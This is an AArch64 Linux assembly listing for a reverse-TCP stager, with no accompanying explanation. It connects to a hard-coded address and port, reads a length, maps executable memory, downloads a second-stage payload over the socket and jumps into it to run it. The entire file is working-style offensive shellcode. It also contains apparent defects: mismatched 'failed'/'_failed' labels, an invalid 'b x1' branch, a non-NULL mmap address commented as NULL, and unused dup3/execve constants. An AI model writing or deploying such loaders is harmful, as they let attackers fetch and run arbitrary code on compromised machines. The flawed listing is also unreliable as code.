.equ SYS_SOCKET, 0xc6
.equ SYS_CONNECT, 0xcb
.equ SYS_DUP3, 0x18
.equ SYS_EXECVE, 0xdd
.equ SYS_EXIT, 0x5d

.equ AF_INET, 0x2
.equ SOCK_STREAM, 0x1

.equ STDIN, 0x0
.equ STDOUT, 0x1
.equ STDERR, 0x2

.equ IP, 0x0100007f
.equ PORT, 0x5C11

_start:
        // sockfd = socket(AF_INET, SOCK_STREAM, 0)
        mov    x0, AF_INET
        mov    x1, SOCK_STREAM
        mov    x2, 0
        mov    x8, SYS_SOCKET
        svc    0
        mov    x12, x0

        // connect(sockfd, (struct sockaddr *)&server, sockaddr_len)
        adr    x1, sockaddr
        mov    x2, 0x10
        mov    x8, SYS_CONNECT
        svc    0
        cbnz   w0, failed

		// ssize_t read(int fd, void *buf, size_t len);
		mov x0,x12         // sockfd
		sub sp,sp,#4
		ldr x8,=63         // __NR_read
		mov x1,sp          // *buf (on the stack)
		mov x2,#4          // len
		svc 0
		cmn x0, #1
		beq failed

		// round length
		ldr x1,[sp,#0]
		ldr x3,=0xfffff000
		and x1,x1,x3
		mov x2,#1
		lsl x2,x2,#12

		// void *mmap2(void *addr, size_t length, int prot, int flags, int fd, off_t pgoffset);
		add x1,x1,x2       // length
		ldr x8,=222        // __NR_mmap
		ldr x0,=0xffffffff // *addr = NULL
		mov x2,#7          // prot  = PROT_READ | PROT_WRITE | PROT_EXEC
		ldr x3,=0x1022     // flags = MAP_ANON | MAP_PRIVATE
		mov x4,x0          // fd
		mov x5,#0          // pgoffset
		svc 0
		cmn x0, #1
		beq failed

		// recv loop
		// ssize_t recv(int sockfd, void *buf, size_t len, int flags);
		ldr x8,=63         // __NR_read
		mov x1,x0          // *buf
		mov x0,x12         // sockfd
		mov x3,#0          // flags

loop:
		// remove blocksize from total length
		ldr x2,[sp,#0]
		sub x2,x2,#1000
		str x2,[sp,#0]
		cmp x2, #0
		ble last
		mov x2,#1000       // len
		svc 0
		cmp x0, #0
		blt failed
		b loop

last:
		add x2,x2,#1000       // len
		svc 0
		cmp x0, #0
		blt failed
		// branch to code
		b x1

_failed:
		ldr x8,=93         // __NR_exit
		mov x0, #1
		svc 0

.balign 4
sockaddr:
.short AF_INET
.short PORT
.word  IP

